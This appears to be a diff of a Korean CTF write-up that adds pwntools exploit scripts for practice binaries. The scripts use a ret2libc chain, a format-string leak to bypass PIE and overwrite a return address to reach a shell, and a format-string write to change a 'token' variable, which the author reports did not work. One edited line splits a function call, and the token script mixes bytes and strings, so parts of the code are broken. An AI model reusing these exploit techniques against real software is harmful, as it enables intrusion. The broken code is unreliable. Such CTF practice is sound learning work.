@@ -41,7 +41,8 @@ printf_addr = int(p.recv(14), 16)
 libc_base = printf_addr - libc.symbols['printf']
 system_addr = libc_base + libc.symbols['system']
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
-pop_rdi = libc_base + (rop.find_gadget(['pop rdi', 'ret']))[0]
+pop_rdi = libc_base + (r
+op.find_gadget(['pop rdi', 'ret']))[0]
 
 log.info("libc base : %s"%hex(libc_base))
 log.info("system addr : %s"%hex(system_addr))
@@ -149,14 +150,64 @@ p.interactive()
 
 ## problem 5
 
+pie 기법을 우회하는 문제이다. vuln 함수의 실제 주소를 구하려면 fsb를 이용해서 return값을 찾을 수 있다고 생각했다. 4칸만큼 떨어진 곳의 주소를 받아온 뒤에 주소를 이용해여 win함수의 주소를 구하고 그것을 덮는 payload를 보내면 쉘을 얻을 수 있다.
+
+```python
+
+from pwn import *
+
+p = process('./pie')
+e = ELF('./pie')
+libc = e.libc
+
+payload = b"%[4]$p"
+
+p.sendline(payload)
+vuln_addr = u64(p.recvuntil(b'\x10')[-6:].ljust(8, b'\x00'))
+
+pie_base = vuln_addr - 0x1210
+win_addr = pie_base + 0x126f
+
+payload = b'A'*0x10
+payload += b'B'*0x8
+payload += p64(win_addr)
+
+p.sendline(payload)
+
+p.interactive()
 
 
+```
 
 
 
 ## problem 6
 
+token의 값을 1로 변조해야 하는 문제이다.
 
+
+```python
+
+from pwn import *
+
+p = process('./token')
+e = ELF('./token')
+
+token = e.symbols['token']
+
+payload = b'A'*1024;
+payload += b'B'*0x8;
+payload += p64(token)
+payload += '%{}c'.format(0x1024+1-4)
+payload += '%2$hhn'
+
+p.sendline(payload)
+
+p.interactive()
+
+```
+
+fsb 버그 변조와 유사해 보여서 시도해 보았지만 풀지 못했다. ㅜㅜ
 
 
 
